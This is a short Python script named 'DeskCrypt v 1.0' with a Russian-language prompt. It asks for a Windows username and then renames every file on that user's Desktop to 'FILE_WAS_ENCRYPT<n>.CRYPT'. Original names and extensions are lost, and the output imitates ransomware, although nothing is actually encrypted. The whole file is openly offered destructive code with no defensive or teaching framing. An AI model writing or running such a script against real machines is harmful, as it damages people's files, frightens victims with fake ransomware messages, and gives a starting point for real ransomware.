#DeskCrypt v 1.0
import os

def main():
    user = input('\nВведите имя пользователя ПК: ')
    path = 'C:\\Users\\' + str(user) + '\\Desktop\\'
    
    def Crypt0r(path):
        ListFiles = os.listdir(path)
        LenList = len(ListFiles)
            
        for i in range(0, LenList):     
            NewName = 'FILE_WAS_ENCRYPT' + str(i) + '.CRYPT'
            os.rename(path + ListFiles[i], path + str(NewName))
        
    Crypt0r(path)
    
main()
